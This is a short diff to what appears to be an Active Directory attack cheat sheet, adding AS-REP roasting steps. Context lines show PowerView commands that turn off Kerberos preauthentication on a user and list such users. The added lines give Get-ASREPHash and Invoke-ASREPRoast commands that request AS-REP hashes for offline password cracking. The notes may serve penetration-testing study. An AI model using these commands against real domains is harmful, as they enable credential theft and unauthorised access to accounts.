@@ -130,3 +130,21 @@ Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verb
 
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
+
+
+
+- Request encrypted AS-REP for offline brute-force.
+- Let's use `ASREPRoast`
+
+
+```powershell
+Get-ASREPHash -UserName VPN1user -Verbose
+```
+
+
+- To enumerate all users with Kerberos preauth disabled and request a hash
+
+
+```powershell
+Invoke-ASREPRoast -Verbose
+```
